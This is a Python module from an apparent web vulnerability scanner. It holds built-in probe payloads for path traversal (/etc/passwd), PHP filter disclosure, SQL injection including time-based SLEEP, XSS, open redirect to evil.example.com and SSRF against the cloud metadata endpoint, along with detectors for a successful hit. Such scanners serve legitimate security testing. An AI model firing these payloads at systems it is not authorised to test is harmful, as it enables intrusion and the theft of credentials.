"""Editable attack payload library + per-category detectors for `auto`.

Payloads live in the repo-root ``attacks/`` folder, one file per category, one
payload per line (``#`` comments ignored). Users add payloads by editing those
files — no code change. This module loads them (with sensible built-in
fallbacks), decides which categories fit a given parameter (context mode), and
knows how to tell a real hit from noise for each category.
"""

import re
from pathlib import Path

# repo-root/attacks (…/phantomfuzz/attacklib.py -> parent.parent/attacks)
ATTACKS_DIR = Path(__file__).resolve().parent.parent / "attacks"

MARK = "PHX9K7Z"          # unique reflection marker injected for XSS
_XSS_TOKEN = "PHXMARK"    # placeholder in xss.txt, swapped for MARK at load

CATEGORIES = ["traversal", "lfi", "sqli", "xss", "redirect", "ssrf"]
LABELS = {
    "traversal": "Path Traversal",
    "lfi":       "Local File Inclusion",
    "sqli":      "SQL Injection",
    "xss":       "Reflected XSS",
    "redirect":  "Open Redirect",
    "ssrf":      "SSRF",
}
EMOJI = {"traversal": "📁", "lfi": "📁", "sqli": "💉",
         "xss": "🔥", "redirect": "↪️", "ssrf": "🌐"}

# ---- built-in fallbacks (used only if a file is missing/empty) ---------------
_FALLBACK = {
    "traversal": ["../../../../../../etc/passwd", "/etc/passwd",
                  "..%2f..%2f..%2f..%2fetc%2fpasswd"],
    "lfi": ["/etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "sqli": ["'", "' OR '1'='1", "' OR SLEEP(5)-- "],
    "xss": [f'{MARK}"><svg/onload=alert(1)>'],
    "redirect": ["https://evil.example.com", "//evil.example.com"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/"],
}

_cache = {}


def load(cat):
    """Return the payload list for a category (cached)."""
    if cat in _cache:
        return _cache[cat]
    out = []
    f = ATTACKS_DIR / f"{cat}.txt"
    try:
        for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line.replace(_XSS_TOKEN, MARK))
    except Exception:  # noqa: BLE001
        pass
    if not out:
        out = list(_FALLBACK.get(cat, []))
    _cache[cat] = out
    return out


def counts():
    return {c: len(load(c)) for c in CATEGORIES}


# --------------------------------------------------------------------------- #
#  context: which attacks fit a given parameter name
# --------------------------------------------------------------------------- #
FILE_HINTS = ("file", "filename", "path", "page", "doc", "document", "template",
              "include", "inc", "dir", "folder", "download", "read", "load",
              "view", "content", "img", "image", "attachment", "resource")
REDIRECT_HINTS = ("url", "redirect", "next", "return", "returnurl", "return_url",
                  "goto", "dest", "destination", "continue", "target", "link",
                  "callback", "callbackurl", "redirect_uri", "back", "backurl",
                  "out", "to", "u", "forward")
ID_HINTS = ("id", "uid", "pid", "userid", "user", "account", "acct", "order",
            "orderid", "no", "num", "number", "key", "ref", "item", "itemid",
            "record", "product", "productid", "cat", "catid", "category")
SEARCH_HINTS = ("q", "s", "search", "query", "keyword", "keywords", "term",
                "name", "title", "comment", "message", "msg", "text", "body",
                "content", "desc", "description", "subject", "input", "data")


def _match(hints, k):
    """A hint matches if it equals the param name, or (for hints of 3+ chars)
    appears as a substring. Short hints like 'u'/'q'/'to' must match exactly,
    otherwise they fire on unrelated names (e.g. 'u' inside 'prodUct')."""
    for h in hints:
        if h == k or (len(h) >= 3 and h in k):
            return True
    return False


def modes_for_param(key):
    """Context-aware: ordered list of categories most relevant to this param."""
    k = (key or "").lower()
    mods = []
    if _match(FILE_HINTS, k):
        mods += ["traversal", "lfi"]
    if _match(REDIRECT_HINTS, k):
        mods += ["redirect", "ssrf"]
    if _match(ID_HINTS, k):
        mods += ["sqli"]
    if _match(SEARCH_HINTS, k):
        mods += ["xss", "sqli"]
    if not mods:                       # unknown param → a sensible spread
        mods = ["xss", "sqli", "traversal", "redirect"]
    seen = set()
    return [m for m in mods if not (m in seen or seen.add(m))]


def select_categories(choice, key):
    """Resolve the user's menu choice into categories for one parameter."""
    if choice == "all":
        return CATEGORIES
    if choice in ("context", "auto"):
        return modes_for_param(key)
    if choice in CATEGORIES:
        return [choice]
    return modes_for_param(key)


# --------------------------------------------------------------------------- #
#  detection
# --------------------------------------------------------------------------- #
PASSWD_RE = re.compile(r"root:.*?:0:0:")
WININI_RE = re.compile(r"\[fonts\]|\[extensions\]|16-bit app support", re.I)
PROC_RE = re.compile(r"(HTTP_USER_AGENT=|PATH=/usr|SHELL=/|/bin/)")
SQL_ERRORS = re.compile(
    r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite/JDBC|"
    r"Unclosed quotation|quoted string not properly terminated|pg_query\(\)|"
    r"valid MySQL result|SQLSTATE\[|Warning: mysql|supplied argument is not a "
    r"valid MySQL|Microsoft OLE DB Provider|Incorrect syntax near|"
    r"Syntax error.*in query|SQLServer JDBC Driver)", re.I)
# Signatures that appear in an actual cloud-metadata RESPONSE body — chosen so
# they do NOT occur in the SSRF payloads themselves (otherwise a page that
# merely reflects the payload would false-positive as SSRF).
META_RE = re.compile(
    r"(ami-id|instance-id|instance-type|local-ipv4|public-ipv4|local-hostname|"
    r"accessKeyId|SecretAccessKey|InstanceProfileArn|\"Code\"\s*:\s*\"Success\"|"
    r"security-groups|reservation-id)", re.I)
_TIME_RE = re.compile(r"(SLEEP\(|WAITFOR|pg_sleep|BENCHMARK\()", re.I)
_XSS_DANGER = ('"><svg', "><svg/onload", "onerror=alert", "<script>alert",
               "onload=alert", "><img src=x onerror", "ontoggle=alert",
               "onfocus=alert", "onstart=alert")


def detect(cat, payload, resp, baseline=None):
    """Return (is_hit, why) for a single probe response."""
    if resp is None or resp.error:
        return False, ""
    body = resp.body_text

    if cat in ("traversal", "lfi"):
        if PASSWD_RE.search(body):
            return True, "read /etc/passwd (root:...:0:0:)"
        if WININI_RE.search(body):
            return True, "read Windows win.ini"
        if "environ" in payload and PROC_RE.search(body):
            return True, "read /proc/self/environ"
        if payload.startswith("php://filter"):
            stripped = body.strip()
            if 40 <= len(stripped) and re.fullmatch(r"[A-Za-z0-9+/=\s]+", stripped[:400] or ""):
                return True, "PHP source disclosed (base64)"

    elif cat == "sqli":
        if SQL_ERRORS.search(body):
            return True, "database error surfaced by injection"
        if _TIME_RE.search(payload) and resp.elapsed_ms >= 4500:
            return True, f"time-based blind: response slept {int(resp.elapsed_ms)}ms"
        if (baseline and not baseline.error and resp.status >= 500
                and resp.status != baseline.status):
            return True, f"injection flipped status {baseline.status}->{resp.status}"

    elif cat == "xss":
        if payload in body and any(d in payload for d in
                                   ("<svg", "onerror=", "<script", "onload=",
                                    "ontoggle=", "onfocus=", "onstart=")):
            return True, "payload reflected un-encoded (XSS)"
        if MARK in body and any(d in body for d in _XSS_DANGER):
            return True, "marker + breakout reflected un-encoded (XSS)"

    elif cat == "redirect":
        loc = resp.redirect or ""
        if resp.status in (301, 302, 303, 307, 308) and "evil.example.com" in loc:
            return True, f"redirects off-site -> {loc}"

    elif cat == "ssrf":
        # only a hit if the metadata signature is in the RESPONSE but not merely
        # a reflection of the payload we sent (that would be a false positive).
        if META_RE.search(body) and not META_RE.search(payload):
            return True, "internal/cloud-metadata content returned (SSRF)"

    return False, ""
